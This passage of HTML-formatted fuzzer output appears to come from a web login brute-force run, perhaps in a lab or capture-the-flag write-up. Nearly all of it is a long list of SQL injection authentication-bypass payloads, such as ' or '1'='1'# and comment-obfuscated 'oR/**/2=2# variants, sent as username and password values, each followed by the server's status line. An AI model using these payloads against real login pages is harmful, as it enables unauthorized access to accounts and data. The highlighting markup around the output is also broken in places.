591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: admin&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span> or 1=1;<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27; or 1=1;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span> or         0=0 <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27; or         0=0 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span> or 1=1 LIMIT 1;<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27; or 1=1 LIMIT 1;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span> OR <span class="string">&#x27;x&#x27;</span>=<span class="string">&#x27;x&#x27;</span><span class="comment">#;</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27; OR &#x27;</span>x<span class="string">&#x27;=&#x27;</span>x<span class="string">&#x27;#;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: admin&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: admin&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: admin&#x27;</span>or 1=1 or <span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: admin&#x27;</span>or 1=1 or <span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span> or 1=1<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>=<span class="string">&#x27; &#x27;</span>or<span class="string">&#x27; and &#x27;</span>=<span class="string">&#x27; &#x27;</span>or<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>=<span class="string">&#x27; &#x27;</span>or<span class="string">&#x27; and &#x27;</span>=<span class="string">&#x27; &#x27;</span>or<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>-<span class="string">&#x27;&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;-&#x27;</span><span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>=<span class="string">&#x27;&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;=&#x27;</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>-<span class="string">&#x27;&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;-&#x27;</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: 0&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: 0<span class="string">&#x27;&lt;&#x27;</span>2<span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: 0&#x27;</span>&lt;<span class="string">&#x27;2&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: 0<span class="string">&#x27;&lt;&#x27;</span>2<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>^<span class="string">&#x27;&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;^&#x27;</span><span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>=<span class="string">&#x27;&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;=&#x27;</span><span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>*<span class="string">&#x27;&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;*&#x27;</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>^<span class="string">&#x27;&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;^&#x27;</span><span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>*<span class="string">&#x27;&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;*&#x27;</span><span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR(2)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/2=2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR/**/2=2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR 2 oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR 2 oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR(2)-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR(2)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR <span class="literal">true</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR true#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(<span class="literal">true</span>)-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR(true)-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span> LimIT 1-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;=&#x27;</span>2<span class="string">&#x27; LimIT 1-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/2=2/**/oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR/**/2=2/**/oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR <span class="literal">true</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR true-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;=&#x27;</span>2<span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR(2)=2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;oR(2)=2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR 2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR 2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/true-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR/**/true-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR 2=2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR 2=2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(<span class="literal">true</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR(true)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;=&#x27;</span>2<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR <span class="literal">true</span> oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR <span class="literal">true</span> oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR 2=2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;oR 2=2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)=2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR(2)=2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR/**/2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR/**/true/**/oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/true/**/oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/true<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR/**/true#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/2=2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR/**/2=2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR(2)=(2)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)=(2)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/2-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR/**/2-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR 2=2 oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR 2=2 oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>=<span class="string">&#x27;2&#x27;</span> LimIT 1<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;=&#x27;</span>2<span class="string">&#x27; LimIT 1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)LiKE(2)-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR(2)LiKE(2)-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span>oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(<span class="literal">true</span>)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR(<span class="literal">true</span>)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span>-- 2</span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;LiKE&#x27;</span>2<span class="string">&#x27;-- 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR/**/2/**/oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR/**/2/**/oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR<span class="string">&#x27;2&#x27;</span>LiKE<span class="string">&#x27;2&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR&#x27;</span>2<span class="string">&#x27;LiKE&#x27;</span>2<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR 2<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27;oR 2#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>oR(2)LiKE(2)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR(2)LiKE(2)oR<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>oR(2)LiKE(2)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * UNAME: <span class="string">&#x27;oR(2)LiKE(2)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: admin&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: admin<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span 